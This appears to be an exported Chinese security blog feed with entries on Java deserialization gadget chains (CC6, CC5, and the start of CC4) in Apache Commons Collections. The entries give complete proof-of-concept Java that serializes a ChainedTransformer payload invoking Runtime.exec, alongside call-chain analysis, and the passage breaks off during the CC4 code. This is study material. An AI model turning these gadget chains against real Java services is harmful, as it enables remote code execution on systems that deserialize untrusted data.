class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java<span class="selector-class">.io</span><span class="selector-class">.ObjectInputStream</span><span class="selector-class">.readObject</span>()</span><br><span class="line">    java<span class="selector-class">.util</span><span class="selector-class">.HashSet</span><span class="selector-class">.readObject</span>()</span><br><span class="line">        java<span class="selector-class">.util</span><span class="selector-class">.HashMap</span><span class="selector-class">.put</span>()</span><br><span class="line">        java<span class="selector-class">.util</span><span class="selector-class">.HashMap</span><span class="selector-class">.hash</span>()</span><br><span class="line">            org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry</span><span class="selector-class">.hashCode</span>()</span><br><span class="line">            org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry</span><span class="selector-class">.getValue</span>()</span><br><span class="line">               org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.map</span><span class="selector-class">.LazyMap</span><span class="selector-class">.get</span>()</span><br><span class="line">                  后面就和LazyMap一样了</span><br></pre></td></tr></table></figure><p>反向调用分析：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前面和LazyMap链一样</span><br><span class="line">-&gt;</span><br><span class="line">TiedMapEntry.getValue<span class="function"><span class="params">()</span>中调用了<span class="title">map</span>.<span class="title">get</span><span class="params">()</span>，将<span class="title">map</span>的值设为<span class="title">LazyMap</span>即可调用<span class="title">LazyMap</span>.<span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">调用TiedMapEntry.getValue()，触发TiedMapEntry.hashCode()即可</span><br><span class="line">-&gt;</span><br><span class="line">触发TiedMapEntry.hashCode()只需调用HashMap.readObject()中的put</span><br><span class="line">-&gt;</span><br><span class="line">反序列化调用HashMap.readObject()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18085593">https://www.cnblogs.com/F12-blog/p/18085593</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC5</title>
      <link href="/2024/06/24/CC5/"/>
      <url>/2024/06/24/CC5/</url>
      
        <content type="html"><![CDATA[<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>jdk：jdk8u65<br>CC：Commons-Collections 3.2.1</p><h2 id="CC5构造分析"><a href="#CC5构造分析" class="headerlink" title="CC5构造分析"></a>CC5构造分析</h2><p>yso的链</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer<span class="built_in">.transform</span>()</span><br><span class="line">                            ConstantTransformer<span class="built_in">.transform</span>()</span><br><span class="line">                            InvokerTransformer<span class="built_in">.transform</span>()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer<span class="built_in">.transform</span>()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer<span class="built_in">.transform</span>()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line">Requires:</span><br><span class="line">commons-collections</span><br><span class="line">This <span class="keyword">only</span> works <span class="keyword">in</span> JDK <span class="number">8</span>u76 <span class="keyword">and</span> WITHOUT a security manager</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><p>CC5的链和CC1差不多，只不过调用LazyMap.get()用的是 TiedMapEntry.toString()</p><p>TiedMapEntry.toString()</p><p><img src="/2024/06/24/CC5/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240620211114450.png" alt="image-20240620211114450"></p><p>触发getValue()，继续跟进</p><p><img src="/2024/06/24/CC5/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240620211226689.png" alt="image-20240620211226689"></p><p>触发map.get()将map的值赋为LazyMap 即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        tiedMapEntry.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了利用点，现在反过来看下哪能触发 TiedMapEntry.toString()，我们这里选择的是BadAttributeValueExpException.readObject()</p><p><img src="/2024/06/24/CC5/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240620212528203.png" alt="image-20240620212528203"></p><p>这里要注意BadAttributeValueExpException的构造函数也会调用toString()</p><p><img src="/2024/06/24/CC5/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240620213952656.png" alt="image-20240620213952656"></p><p>所以操作还是一样，先随便赋值然后再反射修改</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最终poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">bad</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/1vxyz/p/17473581.html">https://www.cnblogs.com/1vxyz/p/17473581.html</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18085593">https://www.cnblogs.com/F12-blog/p/18085593</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC4</title>
      <link href="/2024/06/24/CC4/"/>
      <url>/2024/06/24/CC4/</url>
      
        <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>测试环境</p><p>jdk：jdk8u65</p><p>CC：Commons-Collections 4.0</p><p>pom.xml添加CC4依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CC4链子分析"><a href="#CC4链子分析" class="headerlink" title="CC4链子分析"></a>CC4链子分析</h2><p>CC4后半段跟CC3后半段一样，只是前半段不一样的。CC4本质上还是和前面几条链一样，调用transform，CC4调用的是TransformingComparator.compare()中的transform，而且TransformingComparator类也是实现了serializable序列化接口的</p><p><img src="/2024/06/24/CC4/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240619214615556.png" alt="image-20240619214615556"></p><p>继续跟进，看哪里调用了compare()，我们这里选择的是PriorityQueue 优先队列类里的siftDownUsingComparator()</p><p><img src="/2024/06/24/CC4/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240619215305.png" alt="QQ图片20240619215305"></p><p>继续跟进看哪里调用了siftDownUsingComparator()，发现是自身类的siftDown()</p><p><img src="/2024/06/24/CC4/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240619215348936.png" alt="image-20240619215348936"></p><p>继续跟进发现自身类的heapfiy()调用了siftDown()</p><p><img src="/2024/06/24/CC4/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240619215454081.png" alt="image-20240619215454081"></p><p>最后跟到自身类的readObject()就结束了</p><p><img src="/2024/06/24/CC4/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240619215622139.png" alt="image-20240619215622139"></p><p>所以CC4的链子就很清晰了</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue<span class="selector-class">.readObject</span>()</span><br><span class="line">    PriorityQueue<span class="selector-class">.heapify</span>()  </span><br><span class="line">        PriorityQueue<span class="selector-class">.siftDown</span>()</span><br><span class="line">            PriorityQueue<span class="selector-class">.siftDownUsingComparator</span>()</span><br><span class="line">                TransformingComparator<span class="selector-class">.compare</span>()</span><br><span class="line">                    ChainedTransformer<span class="selector-class">.transform</span>()</span><br><span class="line">                        InstantiateTransformer<span class="selector-class">.transform</span>()</span><br><span class="line">                            TemplatesImpl<span class="selector-class">.newTransformer</span>()</span><br><span class="line">                                <span class="built_in">defineClass</span>()-&gt;<span class="built_in">newInstance</span>()</span><br></pre></td></tr></table></figure><h2 id="poc构造"><a href="#poc构造" class="headerlink" title="poc构造"></a>poc构造</h2><p>先创建个TransformingComparator实例，将提前构造好的ChainedTransformer实例当作参数传入，再创建个PriorityQueue实例，将刚才创建好的TransformingComparator实例当作参数传入。这样在序列化PriorityQueue实例时就会触发siftDownUsingComparator()，从而调用参数的compare方法，也就是TransformingComparator实例的compare方法，进而进一步触发ChainedTransformer实例的transform方法</p><p>按以上流程下的poc应该如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 